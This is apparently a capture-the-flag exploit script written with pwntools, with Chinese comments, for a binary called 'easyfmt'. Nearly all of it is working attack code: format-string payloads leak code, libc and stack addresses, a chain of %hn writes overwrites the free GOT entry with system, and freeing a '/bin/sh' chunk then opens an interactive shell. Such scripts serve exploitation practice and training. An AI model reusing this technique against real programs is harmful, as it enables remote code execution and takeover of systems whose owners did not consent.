from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
breakrva 0xe2d
breakrva 0xc44
breakrva 0xe2d
continue
'''.format(**locals())

#Binary filename
exe = './easyfmt'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc=ELF('./libc.so.6')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def Alloc(index, size, buf):
    ru("Choice >")
    sl("N")
    ru("Index >")
    sl(str(index))
    ru("Size >")
    sl(str(size))
    ru("Content >")
    sn(buf)
    rl()

def Delete(index):
    ru("Choice >")
    sl("D")
    ru("Index >")
    sl(str(index))
    rl()

def Show(index):
    ru("Choice >")
    sl("S")
    ru("Index >")
    sl(str(index))
    return ru("[N]ew")[:-5]

def Edit(index):
    ru("Choice >")
    sl("E")
    ru("Index >")
    sl(str(index))
    ru("Content >")
    sn(buf)
    rl()


if __name__ == '__main__':
    # 首先来泄露一些基本的信息
    payload0 = "%11$016llx %15$016llx %19$016llx %49$016llx"
    Alloc(0, 512, payload0)
    leaked = Show(0)
    pause()
    leaked = leaked.strip().split(b" ")
    code_base = int(leaked[0], 16) - (0x103C +0x7F) # main+7F
    libc_base = int(leaked[1], 16) - 0x2718a #__libc_start_main+F0
    stack_addr = int(leaked[2], 16)
    stack_addr1 = int(leaked[3], 16) & 0xfffffffffffffff0
    log.success("code_base --> " + hex(code_base))
    log.success("libc_base --> " + hex(libc_base))
    log.success("stack_addr --> " + hex(stack_addr))
    log.success("stack_addr1 --> " + hex(stack_addr1))
    log.success("got free --> " + hex(code_base + elf.got["free"]))
    log.success("point_addr --> " + hex(stack_addr1 ))
    log.success("sys_addr --> " + hex(libc_base + libc.symbols["system"]))
    log.success("free_got_addr --> " + hex(libc_base + libc.symbols["free"]))

    # 先free一下，加载got
    Delete(0)
    # pause()

    payload1_0 = "%0{cnt}c%17$hn".format(cnt = (stack_addr1 ) & 0xffff)
    Alloc(1, 512, payload1_0)
    Show(1)

    #向stack_addr1写入free got 低2字节
    payload1_1 = "%0{cnt}c%43$hn".format(cnt = (code_base + elf.got["free"]) & 0xffff)
    Alloc(2, 512, payload1_1)
    Show(2)

    # 低3、4位写入stack_addr1  + 2
    payload2_0 = "%0{cnt}c%17$hn".format(cnt = (stack_addr1  + 2) & 0xffff)
    Alloc(3, 512, payload2_0)
    Show(3)
    payload2_1 = "%0{cnt}c%43$hn".format(cnt = ((code_base + elf.got["free"]) >> 16) & 0xffff)
    Alloc(4, 512, payload2_1)
    Show(4)

    # 低5、6位写入stack_addr1  + 4
    payload3_0 = "%0{cnt}c%17$hn".format(cnt = (stack_addr1  + 4) & 0xffff)
    Alloc(5, 512, payload3_0)
    Show(5)
    payload3_1 = "%0{cnt}c%43$hn".format(cnt = ((code_base + elf.got["free"]) >> 32) & 0xffff)
    Alloc(6, 512, payload3_1)
    Show(6)

    # 低7、8位写入stack_addr1  + 4
    payload4_0 = "%0{cnt}c%17$hn".format(cnt = (stack_addr1  + 6) & 0xffff)
    Alloc(7, 512, payload4_0)
    Show(7)
    payload4_1 = "%43$hn" #7、8字节为0x00
    Alloc(8, 512, payload4_1)
    Show(8)

    # 计算stack_addr1的地址的偏移
    fmt_off = (stack_addr1 - stack_addr ) / 8 + 43
    log.success("format offset --> " + hex(fmt_off))


    pause()
    # 向在stack_addr1 上保存好的free got里写入system的低2字节
    payload5_0 = "%0{cnt}c%{off}$hn".format(cnt = (libc_base + libc.symbols["system"]) & 0xffff, off = fmt_off)
    Alloc(9, 512, payload5_0)
    Show(9)
    # 将stack_addr1上的值修改为free_got + 2
    payload6_0 = "%0{cnt}c%17$hn".format(cnt = (stack_addr1 ) & 0xffff)
    Alloc(10, 512, payload6_0)
    Show(10)
    payload6_1 = "%0{cnt}c%43$hn".format(cnt = (code_base + elf.got["free"] + 2) & 0xffff)
    Alloc(11, 512, payload6_1)
    Show(11)
    # 向在stack_addr1+2 上保存好的free got里写入system的低3、4字节
    payload6_2 = "%0{cnt}c%{off}$hn".format(cnt = ((libc_base + libc.symbols["system"]) >> 16) & 0xffff, off = fmt_off)
    Alloc(12, 512, payload6_2)
    Show(12)
    # 向在stack_addr1+4 上保存好的free got里写入system的低5、6字节,7、8两个字节基本一样，无需修改
    payload7_1 = "%0{cnt}c%43$hn".format(cnt = (code_base + elf.got["free"] + 4) & 0xffff)
    Alloc(13, 512, payload7_1)
    Show(13)
    payload7_2 = "%0{cnt}c%{off}$hn".format(cnt = ((libc_base + libc.symbols["system"]) >> 32) & 0xffff, off = fmt_off)
    Alloc(14, 512, payload7_2)
    Show(14)
    # pause()
    #构造free("/bin/sh\n")
    Alloc(15, 512, "/bin/sh\n")

    ru("Choice >")
    sl("D")
    ru("Index >")
    sl("15")


    p.interactive()
